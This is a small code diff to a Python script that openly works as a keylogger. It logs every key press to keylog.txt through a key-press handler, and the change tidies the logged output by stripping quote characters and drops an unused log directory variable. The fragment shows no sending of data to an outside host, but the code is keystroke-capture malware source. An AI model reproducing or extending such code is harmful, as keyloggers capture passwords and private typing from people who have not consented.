@@ -4,7 +4,6 @@ import logging
 
 ctrl = Controller()
 
-log_dir = "/"
 logging.basicConfig(
     filename=("keylog.txt"),
     level=logging.INFO,
@@ -13,7 +12,7 @@ logging.basicConfig(
 
 
 def on_key_press(key):
-    logging.info(str(key))
+    logging.info(str(key).replace("'",""))
 
 
 def start_keylogger():
